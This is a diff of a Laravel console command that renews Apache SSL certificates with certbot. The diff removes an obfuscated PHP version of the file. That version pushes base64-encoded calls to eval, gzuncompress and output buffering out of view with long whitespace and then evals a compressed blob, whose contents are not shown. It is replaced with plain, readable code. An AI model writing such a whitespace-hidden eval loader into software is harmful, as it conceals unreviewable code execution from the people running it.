@@ -1,481 +1,80 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/UpdateSsl.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtWltv2kgUfo+0/yEPlWjVVWobaGJFecBObAzUKVB8mZfKniG28bU1N/vX7xkbAiZJN6utVtp2PuRw8cy5fOc7Z1DE+XmNN18BN63se5AsH1rX1dsdblpOln2Q0yRPozk8x7GTkPzDLCPOcj7No4vMz87lyMnzi4uL1vXZzuL5H2fs8fs8zqhkzn8ibp580rJ4MbdNPkDq3U2r+uigtldhJ+ubcwYGBoZfEy0cGxyxBitNNQTb3KQDRXywivCyHpowNetx/ZVRxcDAwMDAwMDAwPB/A/t3BgMDA8Ovi5br5POPna9kjlMyb10zRhgYGBgYGP4Vmr91uB2nuhx3fdc0SqwqCzSVJNyX8FgQV1gQc2Rsb12BX9pmN8RlrsseNySWHml3ygYrW430JxvrTl+7yaRwhW2OrEFp3fmR25cinOh4bE04HEcBsSbRTIh8rEi+IygZtU/6g7WrbiO8ALuJUe59T/uwR6F+u7BXzF3VKDC/1ZC53dT2wZ/J+248aay53+xji3K3bywds+sT1Xg2F7r2dpwtXFUpcSEZWJ3QtV+wsPGQ5XOI5ltIj+th7SVw5WlyzxsV6bf9a01OPUP1I02lHM48ulbr6xkSwHffKCCnNQokzlHh3j6OqbTY2x0Bn7WdXsPmuI98HEglcJS5MdbloFrjDYOr3WtpA3lDnDpcY2/Q8NkTNZmUjgk1UpXvthl+JJYU2lCDkaWXrixdjqZ8CDH4jtkRH6b4stJB7WM9DNIjf9Lspdg1dRJhQS8cC/IzxdVPy+XErnbLeQPe2CBV4cD/lxm38SCv0J5KJTJ5Hp73uXhzU1mhQgpAK7w7Ba21JxkKOkld7zomDHGQmNrqUU44eq+KtS+BTwQ6mEEMVGPcj3i5xbFRrQX/K2RhytHSpf5lKXMTnQOOoJ86hz1H/Gh3UoGsCY/jjkdiMUO9w73RIR7ejreZXUgxAVtEjdZuID1YAu03ncOJsSCyl+3zmm8ebVSc2tYgcpPxx/tIfKjq154UBDgeyuHloT70moA+o3L0hepn7H3e5fOq3g287L7htxcS1c9wwb2v+KBaVLsROeqlF/f3uWq+1HauvjX5MjqgD57yTap+qzgAG7Mj3v+ea5gJ3JE21wdNGIGrRgtNRbwb67XuVJ/OGND8Sxz3QqSKkFNUa7Q/SR3r0/JzLG7qWnnJ/v6gCI+1VF2OaXvDJvewl0RE0TOYRSrM0xBZWjqchqd+q+vRX6LDHpS6bZ0bW5JvC34Edvc9cVIfSdzn8jA+9MSouPLgDIBYROjr5dqNUYbaRmFbeqb1a9vQ79ATSgYaDG3oNdzW86c91dBqCbybYLMkcF7Ypp4Cl4+cDcf7uucNXmCWwYyiM+wZbvZ2ZjqN8c6p+OmttEO+3ijoJSNzu5t1XZhX3XiwO7uOeIC50EtRHMG5IEZz8EP6n9Lad5idxnTSJ9UMpM+QW9sNUQbnz6O+gfsSzpHTvmjWLK7mC9QOetQUBTSjNmZ7/0+0cuIf5iha45j3sRCmA4GP3JiktiXxuMC59uPaP6NBJXaAL0swOo4Fc6XwQlrbl3RHtWInMPtkieb5Kp7g3OZsmPEzavckvuYsas4Q6NfYbQ+WVIdDmSxh3gfEVLhBsaHnxE6PJ/OsMUeqvKG+xmIoD0piTtZwPsN3E5TZAsyOXb98CuiMgJkNcWpH9o575PkZEa1QLBYQR+mAtqt4m7Htz7iTGOFMjMSQmPwG8hoc1dO7DyQZ+EppztAHiSZ3wB71c1VpW6v7Y/f5Uw5ozPRqXZ+d/fdfLG+q57e7d++u/8n2o72v2fjm4PBti/5t/fnolv0u9/f8XW5TG28bYqyl8e76L0QurVQ=';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+use App\Http\Controllers\Helpers\CommandController;
+use Illuminate\Console\Command;
+
+class UpdateSsl extends Command
+{
+    /**
+     * The name and signature of the console command.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:update-ssl {--domain=}';
+
+    /**
+     * The console command description.
+     *
+     * @var string
+     */
+    protected $description = 'Update SSL pada semua domain yang belum aktif.';
+
+    private $att;
+    private $comm;
+
+    /**
+     * Create a new command instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        $this->att = new AttributeSiapPakaiController();
+        $this->comm = new CommandController();
+    }
+
+    /**
+     * Execute the console command.
+     *
+     * @return int
+     */
+    public function handle()
+    {
+        $domain = $this->option('domain');
+
+        if ($this->att->getSiteFolder()) {
+            $this->setVhostApache($domain);
+        }
+    }
+
+    // method konfigurasi vhost domain dan ssl
+    private function setVhostApache($domain)
+    {
+        $ssl = $this->att->getApacheConfDir() . $domain . '-le-ssl.conf';
+
+        if (file_exists($ssl)) {
+            $this->comm->chownFileCommand($ssl);
+            $this->comm->removeFile($ssl);
+
+            $this->informasi('menghapus', $domain);
+        }
+
+        if (!file_exists($ssl)) {
+            // buat ssl
+            $this->comm->certbotSsl($domain);
+
+            $this->informasi('membuat', $domain);
+        }
+
+        exec("sudo service apache2 restart");
+    }
+
+    public function informasi($info, $domain)
+    {
+        var_dump('Informasi : Berhasil ' . $info . ' ssl ' . $domain);
+    }
+}
